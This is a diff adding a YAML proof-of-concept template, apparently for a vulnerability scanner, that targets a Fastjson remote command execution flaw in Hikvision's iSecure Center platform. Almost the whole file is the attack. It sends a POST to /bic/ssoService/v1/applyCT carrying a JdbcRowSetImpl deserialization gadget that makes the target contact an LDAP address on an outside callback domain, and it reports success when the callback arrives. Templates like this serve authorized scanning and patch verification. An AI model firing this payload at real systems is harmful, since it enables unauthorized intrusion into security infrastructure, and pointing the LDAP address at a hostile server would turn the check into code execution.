@@ -1,0 +1,21 @@
+id: poc-yaml-hikvision-iSecureCenter-fastjson-RCE
+info:
+  name: 海康威视-综合安防管理平台-Fastjson远程命令执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: iSecure-Center
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /bic/ssoService/v1/applyCT
+  headers:
+    Content-Type: application/json
+  data: '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{.reverseDomain}}","autoCommit":true},"hfe4zyyzldp":"="}
+
+    '
+  expression: status_code == 500 && reverse.Verify()
+transport: http
